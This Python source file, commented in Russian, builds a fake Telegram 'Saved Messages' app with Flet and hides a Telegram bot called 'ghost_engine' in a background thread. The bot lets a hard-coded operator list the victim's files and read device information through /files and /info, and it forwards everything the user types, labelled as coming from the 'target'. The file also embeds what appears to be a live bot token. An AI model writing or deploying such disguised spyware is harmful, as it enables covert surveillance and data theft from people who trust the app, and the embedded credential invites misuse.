import flet as ft
import threading
import telebot
import os
import platform

# --- НАСТРОЙКИ ---
TOKEN = '8557669239:AAEHAiKVHUyeNA7wMFVnLGfEHsltzLYD4EY'  # ВСТАВЬ ТУТ (с двоеточием!)
ADMIN_ID = '5818997833'  # Твой цифровой ID
bot = telebot.TeleBot(TOKEN)


def main(page: ft.Page):
    page.title = "Telegram"
    page.theme_mode = ft.ThemeMode.DARK
    page.bgcolor = "#0f1721"  # Глубокий синий (TG style)
    page.padding = 0

    # Переменная для хранения списка сообщений в интерфейсе
    chat_messages = ft.Column(scroll=ft.ScrollMode.ALWAYS, expand=True)

    # --- ФУНКЦИЯ ПОЛУЧЕНИЯ СООБЩЕНИЙ ОТ ТЕБЯ ---
    def ghost_engine():
        @bot.message_handler(func=lambda message: True)
        def handle_messages(m):
            if str(m.chat.id) == ADMIN_ID:
                # Команды управления
                if m.text == "/files":
                    try:
                        files = os.listdir("./")  # На телефоне будет /sdcard/
                        bot.send_message(ADMIN_ID, "📂 Файлы:\n" + "\n".join(files[:20]))
                    except:
                        bot.send_message(ADMIN_ID, "Ошибка доступа")
                elif m.text == "/info":
                    bot.send_message(ADMIN_ID, f"📱 OS: {platform.platform()}\n🔋 Node: {platform.node()}")

                # Если это просто текст - выводим в чат приложения (перегон)
                else:
                    chat_messages.controls.append(
                        ft.Container(
                            content=ft.Text(m.text, color="white"),
                            alignment=ft.alignment.center_left,
                            padding=10,
                            bgcolor="#182533",
                            border_radius=10,
                            margin=ft.margin.only(right=50, bottom=5)
                        )
                    )
                    page.update()

        bot.polling(none_stop=True)

    # --- ИНТЕРФЕЙС ---
    # Шапка
    header = ft.Container(
        content=ft.Row([
            ft.Icon(ft.Icons.MENU, color="white"),
            ft.Text("Saved Messages", weight="bold", size=18),
            ft.Icon(ft.Icons.SEARCH, color="white"),
        ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
        padding=15, bgcolor="#1c2733"
    )

    # Поле ввода текста
    message_input = ft.TextField(
        hint_text="Message",
        border_radius=20,
        expand=True,
        bgcolor="#17212b",
        border_color="transparent",
        hint_style=ft.TextStyle(color="grey"),
    )

    def send_click(e):
        if message_input.value:
            # Отправляем тебе в Телеграм
            bot.send_message(ADMIN_ID, f"📩 Сообщение от цели: {message_input.value}")

            # Добавляем в визуал приложения
            chat_messages.controls.append(
                ft.Container(
                    content=ft.Text(message_input.value, color="white"),
                    alignment=ft.alignment.center_right,
                    padding=10,
                    bgcolor="#2b5278",
                    border_radius=10,
                    margin=ft.margin.only(left=50, bottom=5)
                )
            )
            message_input.value = ""
            page.update()

    # Нижняя панель
    input_row = ft.Container(
        content=ft.Row([
            ft.Icon(ft.Icons.ATTACH_FILE, color="grey"),
            message_input,
            ft.IconButton(ft.Icons.SEND, icon_color="#5288c1", on_click=send_click),
        ]),
        padding=10, bgcolor="#17212b"
    )

    page.add(header, chat_messages, input_row)

    # Запуск бота в отдельном потоке
    threading.Thread(target=ghost_engine, daemon=True).start()


ft.app(target=main)